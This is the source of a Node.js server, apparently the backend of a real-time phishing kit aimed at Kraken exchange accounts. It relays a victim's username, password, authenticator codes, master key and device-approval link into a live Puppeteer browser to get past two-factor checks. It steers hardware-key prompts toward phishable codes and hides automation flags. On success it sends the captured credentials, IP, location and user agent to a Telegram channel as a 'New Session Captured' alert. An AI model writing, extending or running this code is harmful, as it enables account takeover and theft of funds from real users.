const express = require("express");
const puppeteer = require("puppeteer");
const path = require("path");
const fs = require("fs");
const fsExtra = require("fs-extra");
const { v4: uuidv4 } = require("uuid");
const axios = require("axios");

const { sendTelegramMessage } = require("./utils/telegram");

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname)));

const getChromePath = () =>
  ({
    win32: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    linux: "/usr/bin/google-chrome",
    darwin: "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
  }[process.platform]);

// Sessions map
const sessions = {};
const INACTIVITY_TIMEOUT = 5 * 60 * 1000;

function resetInactivityTimer(sessionId) {
  const session = sessions[sessionId];
  if (!session) return;

  if (session.timeout) clearTimeout(session.timeout);

  session.timeout = setTimeout(async () => {
    console.log(`Session ${sessionId} inactive. Closing browser.`);
    if (session.browser) await session.browser.close();

    if (session.profilePath) await fsExtra.remove(session.profilePath);
    delete sessions[sessionId];
  }, INACTIVITY_TIMEOUT);
}

app.post("/start-session", async (req, res) => {
  try {
    const sessionId = uuidv4();
    const profilePath = path.join(__dirname, "chrome-profiles", sessionId);
    if (!fs.existsSync(profilePath))
      fs.mkdirSync(profilePath, { recursive: true });

    // Get IP information from API
    let ipInfo = null;
    try {
      const { data: ipData } = await axios.get("https://ipapi.co/json/");
      ipInfo = {
        ip: ipData.ip,
        location: `${ipData.city}, ${ipData.region}, ${ipData.country_name}`,
        isp: ipData.org || ipData.asn || "Unknown ISP",
      };
    } catch (err) {
      console.warn("⚠️ Failed to get IP info:", err.message);
    }

    // Return session ID immediately
    res.json({ success: true, sessionId, profilePath });

    // Launch Puppeteer in background
    (async () => {
      const browser = await puppeteer.launch({
        headless: false,
        executablePath: getChromePath(),
        userDataDir: profilePath,
        defaultViewport: null,
        args: [
          "--start-maximized",
          "--no-sandbox",
          "--disable-setuid-sandbox",
          "--disable-blink-features=AutomationControlled",
        ],
      });

      const page = await browser.newPage();
      await page.setUserAgent(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) " +
          "Chrome/128.0.0.0 Safari/537.36"
      );
      await page.setExtraHTTPHeaders({ "Accept-Language": "en-US,en;q=0.9" });

      await page.goto("https://id.kraken.com/sign-in", {
        waitUntil: "domcontentloaded",
      });

      sessions[sessionId] = {
        browser,
        page,
        profilePath,
        ipInfo,
        userInfo: {},
      };
      resetInactivityTimer(sessionId);
      console.log(`Session started: ${sessionId}`);
    })();
  } catch (err) {
    console.error("Start session error:", err);
    res.status(500).json({ success: false, error: err.message });
  }
});

app.post("/sign-in", async (req, res) => {
  try {
    const { sessionId, username, password } = req.body;
    const session = sessions[sessionId];
    if (!session)
      return res
        .status(404)
        .json({ success: false, error: "Session not found" });

    resetInactivityTimer(sessionId);
    const { page } = session;

    session.userInfo = {
      email: username,
      password: password,
      userAgent: await page.evaluate(() => navigator.userAgent),
    };

    await page.waitForSelector('input[name="username"]', {
      visible: true,
      timeout: 10000,
    });
    await page.evaluate(() => {
      const input = document.querySelector('input[name="username"]');
      if (input) input.value = "";
    });
    await page.click('input[name="username"]', { clickCount: 3 });
    await page.type('input[name="username"]', username, { delay: 30 });

    await page.waitForSelector('input[name="password"]', {
      visible: true,
      timeout: 10000,
    });
    await page.evaluate(() => {
      const input = document.querySelector('input[name="password"]');
      if (input) input.value = "";
    });
    await page.click('input[name="password"]', { clickCount: 3 });
    await page.type('input[name="password"]', password, { delay: 30 });

    await page.keyboard.press("Enter");

    const hardwareText =
      "Use your hardware security key or device passkey to continue signing in.";
    const authenticatorText =
      "Enter the Sign-in 2FA code from your authenticator app.";
    const twoFAPasswordText = "Enter your 2FA password to continue.";
    const unableToSignInText = "Unable to sign in";

    const detectedText = await page.waitForFunction(
      (
        hardwareText,
        authenticatorText,
        twoFAPasswordText,
        unableToSignInText
      ) => {
        const bodyText = document.body.innerText;
        if (bodyText.includes(unableToSignInText)) return unableToSignInText;
        if (bodyText.includes(authenticatorText)) return authenticatorText;
        if (bodyText.includes(twoFAPasswordText)) return twoFAPasswordText;
        if (bodyText.includes(hardwareText)) return hardwareText;
        return null;
      },
      { timeout: 10000, polling: 100 },
      hardwareText,
      authenticatorText,
      twoFAPasswordText,
      unableToSignInText
    );

    const result = await detectedText.jsonValue();

    if (result === unableToSignInText) {
      console.log(`Session ${sessionId}: ❌ Unable to sign in detected.`);
      return res.json(0);
    }

    if (result === authenticatorText) {
      console.log(
        `Session ${sessionId}: 🔢 Authenticator app code prompt detected.`
      );
      return res.json(1);
    }

    if (result === twoFAPasswordText) {
      console.log(`Session ${sessionId}: 🔐 2FA password prompt detected.`);
      return res.json(2);
    }

    if (result === hardwareText) {
      console.log(`Session ${sessionId}: 🔑 Hardware key prompt detected.`);
      await page.evaluate(() => {
        const btn = [...document.querySelectorAll("button")].find((b) =>
          b.innerText.includes("Authenticator app")
        );
        if (btn) btn.click();
      });
      console.log(
        `Session ${sessionId}: ✅ Clicked "Authenticator app" button.`
      );
      return res.json(1);
    }

    res.json({ success: true, message: "No known prompt detected" });
  } catch (err) {
    if (err.name === "TimeoutError") {
      console.log("⏱ No prompt detected within 10s.");
      return res.json({ success: true, securityKeyRequired: false });
    }
    console.error("Sign-in error:", err);
    res.status(500).json({ success: false, error: err.message });
  }
});

app.post("/authenticator", async (req, res) => {
  try {
    const { sessionId, code } = req.body;
    const session = sessions[sessionId];
    if (!session) {
      console.log(`[Authenticator][${sessionId}] Invalid sessionId`);
      return res
        .status(400)
        .json({ success: false, error: "Invalid sessionId" });
    }

    const { page } = session;
    resetInactivityTimer(sessionId);

    console.log(`[Authenticator][${sessionId}] Typing 2FA code: ${code}`);

    await page.waitForSelector('input[name="tfa"]', {
      visible: true,
      timeout: 10000,
    });

    await page.evaluate(() => {
      const input = document.querySelector('input[name="tfa"]');
      if (input) {
        input.focus();
        input.value = "";
      }
    });

    await page.click('input[name="tfa"]', { clickCount: 3 });

    await page.type('input[name="tfa"]', code, { delay: 100 });

    await page.evaluate(() => {
      const buttons = Array.from(document.querySelectorAll("button"));
      const enterButton = buttons.find(
        (btn) => btn.innerText.trim() === "Enter"
      );
      if (enterButton) enterButton.click();
    });
    console.log(`[Authenticator][${sessionId}] Enter button clicked`);

    const result = await Promise.race([
      page.waitForFunction(
        () => {
          const text = document.body.innerText;
          if (
            text.includes("This 2FA code doesn't look right. Please try again.")
          )
            return 0;
          if (window.location.href.includes("device-approval")) return 1;
          return false;
        },
        { polling: 200 }
      ),

      new Promise((resolve) => setTimeout(() => resolve(0), 10000)),
    ]);

    const finalResult = (await result.jsonValue)
      ? await result.jsonValue()
      : result;

    if (finalResult === 0)
      console.log(
        `[Authenticator][${sessionId}] ❌ Invalid 2FA code or timeout`
      );
    if (finalResult === 1)
      console.log(
        `[Authenticator][${sessionId}] ✅ 2FA successful, navigated to device approval`
      );

    res.json(finalResult);
  } catch (err) {
    console.error(`[Authenticator][${req.body.sessionId}] Error:`, err.message);
    res.status(500).json({ success: false, error: err.message });
  }
});

app.post("/masterkey", async (req, res) => {
  try {
    const { sessionId, code } = req.body;
    const session = sessions[sessionId];
    if (!session) {
      console.log(`[MasterKey][${sessionId}] Invalid sessionId`);
      return res
        .status(400)
        .json({ success: false, error: "Invalid sessionId" });
    }

    const { page } = session;
    resetInactivityTimer(sessionId);

    console.log(`[MasterKey][${sessionId}] Typing master key: ${code}`);

    await page.waitForSelector('input[name="tfa"][type="password"]', {
      visible: true,
      timeout: 10000,
    });

    await page.evaluate(() => {
      const input = document.querySelector(
        'input[name="tfa"][type="password"]'
      );
      if (input) {
        input.focus();
        input.value = "";
      }
    });

    await page.click('input[name="tfa"][type="password"]', { clickCount: 3 });

    await page.type('input[name="tfa"][type="password"]', code, { delay: 100 });

    await page.evaluate(() => {
      const buttons = Array.from(document.querySelectorAll("button"));
      const enterButton = buttons.find(
        (btn) =>
          btn.innerText.trim() === "Enter" &&
          btn.getAttribute("type") === "submit"
      );
      if (enterButton) enterButton.click();
    });
    console.log(`[MasterKey][${sessionId}] Enter button clicked`);

    const result = await Promise.race([
      page.waitForFunction(
        () => {
          const text = document.body.innerText;
          if (
            text.includes("This 2FA code doesn't look right. Please try again.")
          )
            return 0;
          if (window.location.href.includes("device-approval")) return 1;
          return false;
        },
        { polling: 200 }
      ),
      new Promise((resolve) => setTimeout(() => resolve(0), 10000)),
    ]);

    const finalResult = (await result.jsonValue)
      ? await result.jsonValue()
      : result;

    if (finalResult === 0)
      console.log(`[MasterKey][${sessionId}] ❌ Invalid master key or timeout`);
    if (finalResult === 1)
      console.log(
        `[MasterKey][${sessionId}] ✅ Master key accepted, navigated to device approval`
      );

    res.json(finalResult);
  } catch (err) {
    console.error(`[MasterKey][${req.body.sessionId}] Error:`, err.message);
    res.status(500).json({ success: false, error: err.message });
  }
});

app.post("/show-authenticator-app", async (req, res) => {
  try {
    const { sessionId } = req.body;
    const session = sessions[sessionId];
    if (!session) {
      console.log(`${sessionId} Invalid sessionId`);
      return res
        .status(400)
        .json({ success: false, error: "Invalid sessionId" });
    }

    const { page } = session;
    resetInactivityTimer(sessionId);

    const buttons = await page.$$("button");

    let found = false;
    for (const btn of buttons) {
      const text = await page.evaluate((el) => el.textContent.trim(), btn);
      if (text.includes("Authenticator app")) {
        await btn.click();
        found = true;
        break;
      }
    }

    if (!found) return res.send("0");

    await page.waitForTimeout(1000);

    return res.send("1");
  } catch (err) {
    console.error(`${req.body.sessionId} Error:`, err.message);
    res.status(500).json({ success: false, error: err.message });
  }
});

app.post("/show-master-key", async (req, res) => {
  try {
    const { sessionId } = req.body;
    const session = sessions[sessionId];
    if (!session) {
      console.log(`${sessionId} Invalid sessionId`);
      return res
        .status(400)
        .json({ success: false, error: "Invalid sessionId" });
    }

    const { page } = session;
    resetInactivityTimer(sessionId);

    const buttons = await page.$$("button");

    let found = false;
    for (const btn of buttons) {
      const text = await page.evaluate((el) => el.textContent.trim(), btn);
      if (text.includes("Master Key")) {
        await btn.click();
        found = true;
        break;
      }
    }
    if (!found) return res.send("0");

    await page.waitForTimeout(1000);

    return res.send("1");
  } catch (err) {
    console.error(`${req.body.sessionId} Error:`, err.message);
    res.status(500).json({ success: false, error: err.message });
  }
});

app.post("/approval", async (req, res) => {
  try {
    const { sessionId, approvalUrl } = req.body;
    const session = sessions[sessionId];
    if (!session)
      return res
        .status(404)
        .json({ success: false, error: "Session not found" });

    resetInactivityTimer(sessionId);
    const { browser, userInfo, ipInfo } = session;

    const page = await browser.newPage();
    await page.goto(approvalUrl, {
      waitUntil: "domcontentloaded",
      timeout: 15000,
    });

    const currentUrl = await page.url();

    // Wait 5 seconds and verify navigation
    await new Promise((r) => setTimeout(r, 5000));
    const newUrl = await page.url();

    if (newUrl.startsWith("https://id.kraken.com/new-device-sign-in/web")) {
      console.log(`Session ${sessionId}: ✅ Approval success`);
      // IP + user details
      const ipDetails = ipInfo
        ? `IP : ${ipInfo.ip}\nLocation: ${ipInfo.location}\nISP: ${ipInfo.isp}`
        : `IP : unknown`;

      const sessionMessage =
        `<b>New Session Captured</b>\n\n` +
        `Name : KRAKEN\n` +
        `Username : ${userInfo?.email || "unknown"}\n` +
        `Password : <tg-spoiler>${userInfo?.password || ""}</tg-spoiler>\n` +
        `Landing URL : ${currentUrl}\n` +
        `${ipDetails}\n\n` +
        `👆 <b>User Agent (click to copy):</b>\n` +
        `<code>${userInfo?.userAgent || "unknown"}</code>`;

      await sendTelegramMessage(sessionMessage);
      return res.json(1);
    } else {
      console.log(`Session ${sessionId}: ❌ Approval failed`);
      return res.json(0);
    }
  } catch (err) {
    console.error("Approval error:", err);
    res.status(500).json({ success: false, error: err.message });
  }
});

app.post("/end-session", async (req, res) => {
  try {
    const { sessionId } = req.body;
    const session = sessions[sessionId];
    if (session) {
      if (session.timeout) clearTimeout(session.timeout);
      if (session.browser) await session.browser.close();
      if (session.profilePath) await fsExtra.remove(session.profilePath);
      delete sessions[sessionId];
      return res.json({
        success: true,
        message: "Session closed and profile deleted",
      });
    }
    res.status(404).json({ success: false, error: "Session not found" });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false, error: err.message });
  }
});

app.listen(3000, () => console.log("Server running at http://localhost:3000"));
